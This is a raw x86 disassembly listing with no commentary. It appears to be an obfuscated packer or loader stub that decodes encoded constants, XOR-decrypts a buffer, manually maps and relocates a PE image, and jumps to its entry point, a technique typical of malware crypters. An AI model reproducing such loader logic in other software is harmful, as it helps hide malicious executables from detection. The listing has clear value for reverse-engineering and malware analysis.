  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
  41e0b3:	mov    BYTE PTR [ebp-0x1],al
  41e0b6:	mov    eax,DWORD PTR [ebp-0x8]
  41e0b9:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0bc:	xor    eax,ebx
  41e0be:	add    eax,esi
  41e0c0:	imul   eax,ecx
  41e0c3:	mov    ecx,DWORD PTR [ebp-0x10]
  41e0c6:	xor    ecx,ebx
  41e0c8:	add    eax,ecx
  41e0ca:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0cd:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e0d5:	mov    ecx,DWORD PTR [ebp-0x9c]
  41e0db:	xor    ecx,ebx
  41e0dd:	lea    eax,[ecx+eax*1+0x3272e2]
  41e0e4:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e0e8:	xor    ecx,eax
  41e0ea:	mov    BYTE PTR [ebp-0x1],cl
  41e0ed:	mov    al,BYTE PTR [ebp-0x1]
  41e0f0:	mov    ecx,DWORD PTR [ebp-0x8]
  41e0f3:	mov    edx,DWORD PTR [ebp-0x18]
  41e0f6:	xor    ecx,ebx
  41e0f8:	add    ecx,esi
  41e0fa:	imul   ecx,edx
  41e0fd:	mov    edx,DWORD PTR [ebp-0x1c]
  41e100:	mov    BYTE PTR [ecx+edx*1],al
  41e103:	mov    eax,DWORD PTR [ebp-0x34]
  41e106:	mov    ecx,DWORD PTR [ebp-0x10]
  41e109:	xor    eax,ebx
  41e10b:	xor    ecx,ebx
  41e10d:	add    eax,esi
  41e10f:	add    ecx,esi
  41e111:	imul   eax,ecx
  41e114:	add    eax,DWORD PTR [ebp-0x18]
  41e117:	mov    DWORD PTR [ebp-0x18],eax
  41e11a:	mov    eax,DWORD PTR [ebp-0x18]
  41e11d:	mov    ecx,DWORD PTR [ebp-0x20]
  41e120:	cmp    ecx,eax
  41e122:	jb     0x41e029
  41e128:	mov    eax,DWORD PTR [ebp-0x10]
  41e12b:	mov    ecx,DWORD PTR [ebp-0x20]
  41e12e:	xor    eax,ebx
  41e130:	add    eax,esi
  41e132:	imul   eax,ecx
  41e135:	mov    ecx,DWORD PTR [ebp-0x54]
  41e138:	xor    ecx,ebx
  41e13a:	add    ecx,esi
  41e13c:	or     eax,ecx
  41e13e:	mov    ecx,DWORD PTR [ebp-0x30]
  41e141:	xor    ecx,ebx
  41e143:	add    eax,ecx
  41e145:	mov    ecx,DWORD PTR [ebp-0x30]
  41e148:	xor    ecx,ebx
  41e14a:	add    eax,ecx
  41e14c:	mov    ecx,DWORD PTR [ebp-0xc]
  41e14f:	lea    eax,[eax+ecx*1+0x64e5c4]
  41e156:	jmp    0x41e167
  41e158:	mov    eax,DWORD PTR [ebp-0x30]
  41e15b:	mov    ecx,DWORD PTR [ebp-0xc]
  41e15e:	xor    eax,ebx
  41e160:	lea    eax,[eax+ecx*1+0x3272e2]
  41e167:	mov    DWORD PTR [ebp-0xc],eax
  41e16a:	mov    eax,DWORD PTR [ebp-0x30]
  41e16d:	xor    eax,ebx
  41e16f:	mov    ecx,0xffcd8d1e
  41e174:	sub    ecx,eax
  41e176:	add    ecx,DWORD PTR [ebp-0x38]
  41e179:	mov    eax,DWORD PTR [ebp-0x30]
  41e17c:	mov    edx,DWORD PTR [ebp-0xc]
  41e17f:	xor    eax,ebx
  41e181:	add    eax,esi
  41e183:	imul   eax,edx
  41e186:	cmp    eax,ecx
  41e188:	jbe    0x41dfa3
  41e18e:	push   DWORD PTR [ebp+0x8]
  41e191:	mov    eax,DWORD PTR [ebp+0x8]
  41e194:	push   DWORD PTR [eax+0x1cc]
  41e19a:	lea    eax,[ebp-0xa0]
  41e1a0:	push   eax
  41e1a1:	mov    eax,DWORD PTR [ebp+0x8]
  41e1a4:	mov    eax,DWORD PTR [eax+0x1c4]
  41e1aa:	push   DWORD PTR [eax]
  41e1ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e1af:	mov    eax,DWORD PTR [eax+0x1c0]
  41e1b5:	push   DWORD PTR [eax]
  41e1b7:	push   DWORD PTR [ebp-0x3c]
  41e1ba:	push   DWORD PTR [ebp-0x2c]
  41e1bd:	call   0x41ec54
  41e1c2:	mov    DWORD PTR [ebp-0x40],eax
  41e1c5:	mov    eax,DWORD PTR [ebp-0x14]
  41e1c8:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e1cb:	xor    eax,ebx
  41e1cd:	add    eax,esi
  41e1cf:	cmp    eax,ecx
  41e1d1:	je     0x41e1f2
  41e1d3:	mov    eax,DWORD PTR [ebp+0x8]
  41e1d6:	mov    ecx,DWORD PTR [ebp-0x50]
  41e1d9:	mov    eax,DWORD PTR [eax+0x1d8]
  41e1df:	xor    ecx,ebx
  41e1e1:	add    ecx,esi
  41e1e3:	push   ecx
  41e1e4:	mov    ecx,DWORD PTR [ebp-0x14]
  41e1e7:	xor    ecx,ebx
  41e1e9:	add    ecx,esi
  41e1eb:	push   ecx
  41e1ec:	push   DWORD PTR [ebp-0x2c]
  41e1ef:	call   DWORD PTR [eax+0x18]
  41e1f2:	pop    edi
  41e1f3:	pop    esi
  41e1f4:	pop    ebx
  41e1f5:	leave  
  41e1f6:	ret    0x4
  41e1f9:	push   ebp
  41e1fa:	mov    ebp,esp
  41e1fc:	push   ecx
  41e1fd:	push   ecx
  41e1fe:	lea    eax,[ebp-0x8]
  41e201:	mov    DWORD PTR [ebp-0x4],eax
  41e204:	push   esi
  41e205:	mov    esi,DWORD PTR [ebp-0x4]
  41e208:	mov    eax,0xf881ba0f
  41e20d:	mov    DWORD PTR [esi],eax
  41e20f:	mov    esi,DWORD PTR [ebp-0x8]
  41e212:	cmp    esi,eax
  41e214:	pop    esi
  41e215:	jne    0x41e21f
  41e217:	mov    BYTE PTR [ecx+0xa],0x7c
  41e21b:	mov    BYTE PTR [edx+0x8],0x2f
  41e21f:	mov    BYTE PTR [edx+0xa],0x7c
  41e223:	mov    BYTE PTR [ecx+0x2],0x2
  41e227:	leave  
  41e228:	ret    
  41e229:	push   ebp
  41e22a:	mov    ebp,esp
  41e22c:	push   ecx
  41e22d:	push   ecx
  41e22e:	lea    eax,[ebp-0x8]
  41e231:	mov    DWORD PTR [ebp-0x4],eax
  41e234:	mov    edx,DWORD PTR [ebp-0x4]
  41e237:	mov    eax,0xf88b0be3
  41e23c:	mov    DWORD PTR [edx],eax
  41e23e:	mov    edx,DWORD PTR [ebp-0x8]
  41e241:	cmp    edx,eax
  41e243:	jne    0x41e254
  41e245:	mov    eax,DWORD PTR [ebp+0x8]
  41e248:	mov    BYTE PTR [ecx+0x9],0x8
  41e24c:	mov    BYTE PTR [eax+0x7],0x47
  41e250:	mov    BYTE PTR [ecx+0x6],0xf
  41e254:	mov    BYTE PTR [ecx+0x3],0x18
  41e258:	leave  
  41e259:	ret    0x4
  41e25c:	push   ebp
  41e25d:	mov    ebp,esp
  41e25f:	push   ecx
  41e260:	push   ecx
  41e261:	lea    eax,[ebp-0x8]
  41e264:	mov    DWORD PTR [ebp-0x4],eax
  41e267:	mov    edx,DWORD PTR [ebp-0x4]
  41e26a:	mov    eax,0x7e0da0f
  41e26f:	mov    DWORD PTR [edx],eax
  41e271:	mov    edx,DWORD PTR [ebp-0x8]
  41e274:	cmp    edx,eax
  41e276:	jne    0x41e27c
  41e278:	mov    BYTE PTR [ecx+0x7],0x47
  41e27c:	mov    eax,DWORD PTR [ebp+0x8]
  41e27f:	mov    BYTE PTR [ecx+0x1],0x5
  41e283:	mov    BYTE PTR [eax+0x9],0x28
  41e287:	leave  
  41e288:	ret    0x4
  41e28b:	push   ebp
  41e28c:	mov    ebp,esp
  41e28e:	push   ecx
  41e28f:	push   ecx
  41e290:	lea    eax,[ebp-0x8]
  41e293:	mov    DWORD PTR [ebp-0x4],eax
  41e296:	push   esi
  41e297:	mov    esi,DWORD PTR [ebp-0x4]
  41e29a:	mov    eax,0x7060e3e
  41e29f:	mov    DWORD PTR [esi],eax
  41e2a1:	mov    esi,DWORD PTR [ebp-0x8]
  41e2a4:	cmp    esi,eax
  41e2a6:	pop    esi
  41e2a7:	jne    0x41e2b3
  41e2a9:	mov    BYTE PTR [edx+0x4],0x3
  41e2ad:	mov    WORD PTR [ecx+0x3],0x318
  41e2b3:	mov    BYTE PTR [edx],0x3f
  41e2b6:	leave  
  41e2b7:	ret    
  41e2b8:	push   ebp
  41e2b9:	mov    ebp,esp
  41e2bb:	push   ecx
  41e2bc:	push   ecx
  41e2bd:	lea    eax,[ebp-0x8]
  41e2c0:	mov    DWORD PTR [ebp-0x4],eax
  41e2c3:	mov    edx,DWORD PTR [ebp-0x4]
  41e2c6:	mov    eax,0xf8870b3f
  41e2cb:	mov    DWORD PTR [edx],eax
  41e2cd:	mov    edx,DWORD PTR [ebp-0x8]
  41e2d0:	cmp    edx,eax
  41e2d2:	jne    0x41e2df
  41e2d4:	mov    eax,DWORD PTR [ebp+0x8]
  41e2d7:	mov    BYTE PTR [ecx+0x8],0xf
  41e2db:	mov    BYTE PTR [eax+0x1],0x5
  41e2df:	mov    BYTE PTR [ecx+0x5],0xb
  41e2e3:	leave  
  41e2e4:	ret    0x4
  41e2e7:	push   esi
  41e2e8:	mov    ecx,edi
  41e2ea:	call   0x41e2b8
  41e2ef:	mov    edx,edi
  41e2f1:	mov    ecx,esi
  41e2f3:	mov    BYTE PTR [esi],0x1f
  41e2f6:	call   0x41e28b
  41e2fb:	push   esi
  41e2fc:	mov    ecx,edi
  41e2fe:	mov    BYTE PTR [esi+0x5],0xb
  41e302:	call   0x41e25c
  41e307:	push   esi
  41e308:	mov    BYTE PTR [esi+0x6],0xf
  41e30c:	call   0x41e229
  41e311:	mov    BYTE PTR [esi+0x2],0x2
  41e315:	mov    edx,esi
  41e317:	jmp    0x41e1f9
  41e31c:	push   ebp
  41e31d:	mov    ebp,esp
  41e31f:	push   ecx
  41e320:	mov    ecx,DWORD PTR [edx+0x194]
  41e326:	push   esi
  41e327:	mov    esi,DWORD PTR [ebp+0x8]
  41e32a:	mov    esi,DWORD PTR [esi]
  41e32c:	mov    DWORD PTR [ecx],esi
  41e32e:	mov    ecx,DWORD PTR [edx+0x194]
  41e334:	mov    ecx,DWORD PTR [ecx]
  41e336:	mov    esi,DWORD PTR [edx+0x190]
  41e33c:	mov    DWORD PTR [esi],ecx
  41e33e:	mov    eax,DWORD PTR [edx+0x194]
  41e344:	mov    ecx,DWORD PTR [eax]
  41e346:	mov    ecx,DWORD PTR [ecx+0x3c]
  41e349:	add    ecx,DWORD PTR [eax]
  41e34b:	mov    DWORD PTR [ebp-0x4],0xf89ca585
  41e352:	mov    eax,DWORD PTR [ebp-0x4]
  41e355:	movzx  ecx,WORD PTR [ecx+0x16]
  41e359:	xor    eax,0x751089b
  41e35e:	add    eax,0x3272e2
  41e363:	pop    esi
  41e364:	test   ecx,eax
  41e366:	je     0x41e374
  41e368:	mov    eax,DWORD PTR [edx+0x1c8]
  41e36e:	mov    DWORD PTR [eax],0xf89c8584
  41e374:	leave  
  41e375:	ret    0x4
  41e378:	push   ebp
  41e379:	mov    ebp,esp
  41e37b:	sub    esp,0x70
  41e37e:	and    DWORD PTR [ebp-0x20],0x0
  41e382:	mov    DWORD PTR [ebp-0x18],0xf89cb585
  41e389:	mov    DWORD PTR [ebp-0x1c],0xf89c85c5
  41e390:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  41e397:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  41e39e:	mov    DWORD PTR [ebp-0x2c],0xf89f0585
  41e3a5:	mov    eax,DWORD PTR [ebp+0x20]
  41e3a8:	mov    eax,DWORD PTR [eax+0x194]
  41e3ae:	mov    DWORD PTR [ebp-0xc],eax
  41e3b1:	mov    eax,DWORD PTR [ebp+0x20]
  41e3b4:	push   ebx
  41e3b5:	push   esi
  41e3b6:	mov    esi,DWORD PTR [eax+0x190]
  41e3bc:	mov    eax,DWORD PTR [ebp+0x20]
  41e3bf:	mov    eax,DWORD PTR [eax+0x18c]
  41e3c5:	mov    DWORD PTR [ebp-0x8],eax
  41e3c8:	mov    eax,DWORD PTR [eax]
  41e3ca:	push   edi
  41e3cb:	mov    DWORD PTR [ebp-0x4],esi
  41e3ce:	test   eax,eax
  41e3d0:	jne    0x41e3dd
  41e3d2:	push   DWORD PTR [ebp+0x1c]
  41e3d5:	mov    edx,DWORD PTR [ebp+0x20]
  41e3d8:	call   0x41e31c
  41e3dd:	mov    eax,DWORD PTR [esi]
  41e3df:	mov    ebx,DWORD PTR [esi]
  41e3e1:	add    ebx,DWORD PTR [eax+0x3c]
  41e3e4:	mov    eax,DWORD PTR [ebp+0xc]
  41e3e7:	mov    ecx,DWORD PTR [ebp-0x8]
  41e3ea:	mov    ecx,DWORD PTR [ecx]
  41e3ec:	mov    esi,0x751089b
  41e3f1:	xor    eax,esi
  41e3f3:	mov    edi,0x3272e2
  41e3f8:	add    eax,edi
  41e3fa:	cmp    eax,ecx
  41e3fc:	jne    0x41e634
  41e402:	mov    eax,DWORD PTR [ebp-0xc]
  41e405:	mov    eax,DWORD PTR [eax]
  41e407:	mov    DWORD PTR [ebp-0x10],eax
  41e40a:	mov    eax,DWORD PTR [ebx+0x50]
  41e40d:	mov    DWORD PTR [ebp-0x68],eax
  41e410:	mov    eax,DWORD PTR [ebp-0x18]
  41e413:	xor    eax,esi
  41e415:	add    eax,edi
  41e417:	mov    DWORD PTR [ebp-0x64],eax
  41e41a:	mov    eax,DWORD PTR [ebp-0x14]
  41e41d:	and    DWORD PTR [ebp-0x6c],0x0
  41e421:	xor    eax,esi
  41e423:	add    eax,edi
  41e425:	mov    DWORD PTR [ebp-0x60],eax
  41e428:	lea    eax,[ebp-0x70]
  41e42b:	push   eax
  41e42c:	mov    eax,DWORD PTR [ebp+0x8]
  41e42f:	xor    eax,esi
  41e431:	add    eax,edi
  41e433:	push   eax
  41e434:	mov    eax,DWORD PTR [ebp+0x20]
  41e437:	add    eax,0xaa
  41e43c:	push   eax
  41e43d:	mov    eax,DWORD PTR [ebp+0x20]
  41e440:	mov    eax,DWORD PTR [eax+0x198]
  41e446:	mov    DWORD PTR [ebp-0x70],0x4
  41e44d:	push   DWORD PTR [eax]
  41e44f:	mov    eax,DWORD PTR [ebp+0x10]
  41e452:	call   eax
  41e454:	mov    ecx,DWORD PTR [ebp-0xc]
  41e457:	mov    ecx,DWORD PTR [ecx]
  41e459:	mov    edx,DWORD PTR [ebp-0x8]
  41e45c:	mov    DWORD PTR [ebp-0x6c],eax
  41e45f:	mov    DWORD PTR [ebp+0x1c],eax
  41e462:	mov    DWORD PTR [edx],ecx
  41e464:	mov    ecx,DWORD PTR [ebp-0x4]
  41e467:	mov    DWORD PTR [ecx],eax
  41e469:	mov    eax,DWORD PTR [ebx+0x50]
  41e46c:	mov    DWORD PTR [ebp-0x68],eax
  41e46f:	mov    eax,DWORD PTR [ebp-0x1c]
  41e472:	xor    eax,esi
  41e474:	add    eax,edi
  41e476:	mov    DWORD PTR [ebp-0x64],eax
  41e479:	lea    eax,[ebp-0x20]
  41e47c:	mov    DWORD PTR [ebp-0x60],eax
  41e47f:	lea    eax,[ebp-0x70]
  41e482:	push   eax
  41e483:	mov    eax,DWORD PTR [ebp+0x8]
  41e486:	xor    eax,esi
  41e488:	add    eax,edi
  41e48a:	push   eax
  41e48b:	mov    eax,DWORD PTR [ebp+0x20]
  41e48e:	add    eax,0xee
  41e493:	push   eax
  41e494:	mov    eax,DWORD PTR [ebp+0x20]
  41e497:	mov    eax,DWORD PTR [eax+0x198]
  41e49d:	mov    DWORD PTR [ebp-0x70],0x4
  41e4a4:	push   DWORD PTR [eax]
  41e4a6:	mov    eax,DWORD PTR [ebp+0x10]
  41e4a9:	call   eax
  41e4ab:	test   eax,eax
  41e4ad:	je     0x41e4d2
  41e4af:	and    DWORD PTR [ebp+0xc],0x0
  41e4b3:	cmp    DWORD PTR [ebx+0x50],0x0
  41e4b7:	jbe    0x41e4d2
  41e4b9:	mov    eax,DWORD PTR [ebp+0x1c]
  41e4bc:	mov    ecx,DWORD PTR [ebp-0x10]
  41e4bf:	sub    ecx,eax
  41e4c1:	mov    dl,BYTE PTR [ecx+eax*1]
  41e4c4:	inc    DWORD PTR [ebp+0xc]
  41e4c7:	mov    BYTE PTR [eax],dl
  41e4c9:	mov    edx,DWORD PTR [ebp+0xc]
  41e4cc:	inc    eax
  41e4cd:	cmp    edx,DWORD PTR [ebx+0x50]
  41e4d0:	jb     0x41e4c1
  41e4d2:	mov    edx,DWORD PTR [ebp+0x1c]
  41e4d5:	mov    ecx,DWORD PTR [edx+0x3c]
  41e4d8:	add    ecx,edx
  41e4da:	mov    eax,DWORD PTR [ecx+0xa0]
  41e4e0:	mov    ebx,DWORD PTR [ecx+0x28]
  41e4e3:	add    eax,edx
  41e4e5:	sub    edx,DWORD PTR [ebp-0x10]
  41e4e8:	add    ebx,DWORD PTR [ebp+0x1c]
  41e4eb:	mov    DWORD PTR [ebp+0xc],edx
  41e4ee:	mov    DWORD PTR [ebp-0x2c],ecx
  41e4f1:	mov    DWORD PTR [ebp-0x14],ebx
  41e4f4:	mov    DWORD PTR [ebp-0x8],0x0
  41e4fb:	jmp    0x41e577
  41e4fd:	add    edx,0xfffffff8
  41e500:	shr    edx,1
  41e502:	mov    DWORD PTR [ebp-0x18],edx
  41e505:	je     0x41e563
  41e507:	lea    edx,[eax+0x8]
  41e50a:	mov    DWORD PTR [ebp-0x4],edx
  41e50d:	mov    edx,DWORD PTR [ebp-0x18]
  41e510:	mov    DWORD PTR [ebp-0x18],edx
  41e513:	mov    edx,DWORD PTR [ebp-0x4]
  41e516:	movzx  edx,WORD PTR [edx]
  41e519:	mov    DWORD PTR [ebp-0x24],edx
  41e51c:	and    edx,0xfff
  41e522:	mov    DWORD PTR [ebp-0x28],edx
  41e525:	mov    edx,DWORD PTR [ebp-0x24]
  41e528:	shr    edx,0xc
  41e52b:	add    edx,0xffcd8d1e
  41e531:	xor    edx,esi
  41e533:	cmp    edx,0xf89c85ba
  41e539:	jne    0x41e55a
  41e53b:	mov    edx,DWORD PTR [ebp-0x28]
  41e53e:	add    edx,DWORD PTR [ebp+0x1c]
  41e541:	mov    ebx,DWORD PTR [eax]
  41e543:	cmp    DWORD PTR [ebx+edx*1],0x0
  41e547:	je     0x41e557
  41e549:	mov    ecx,DWORD PTR [ebp+0xc]
  41e54c:	add    ecx,DWORD PTR [ebx+edx*1]
  41e54f:	mov    ebx,DWORD PTR [eax]
  41e551:	mov    DWORD PTR [edx+ebx*1],ecx
  41e554:	mov    ecx,DWORD PTR [ebp-0x2c]
  41e557:	mov    ebx,DWORD PTR [ebp-0x14]
  41e55a:	add    DWORD PTR [ebp-0x4],0x2
  41e55e:	dec    DWORD PTR [ebp-0x18]
  41e561:	jne    0x41e513
  41e563:	mov    edx,DWORD PTR [ebp-0xc]
  41e566:	add    DWORD PTR [ebp-0x8],edx
  41e569:	mov    edx,DWORD PTR [ebp-0x8]
  41e56c:	cmp    edx,DWORD PTR [ecx+0xa4]
  41e572:	jae    0x41e585
  41e574:	add    eax,DWORD PTR [ebp-0xc]
  41e577:	mov    edx,DWORD PTR [eax+0x4]
  41e57a:	mov    DWORD PTR [ebp-0xc],edx
  41e57d:	test   edx,edx
  41e57f:	jne    0x41e4fd
  41e585:	mov    eax,DWORD PTR [ebp-0x10]
  41e588:	mov    DWORD PTR [ebp-0x6c],eax
  41e58b:	mov    DWORD PTR [ebp-0x70],0x4
  41e592:	mov    eax,DWORD PTR [ecx+0x50]
  41e595:	mov    DWORD PTR [ebp-0x68],eax
  41e598:	mov    eax,DWORD PTR [ebp-0x1c]
  41e59b:	xor    eax,esi
  41e59d:	add    eax,edi
  41e59f:	mov    DWORD PTR [ebp-0x64],eax
  41e5a2:	lea    eax,[ebp-0x20]
  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
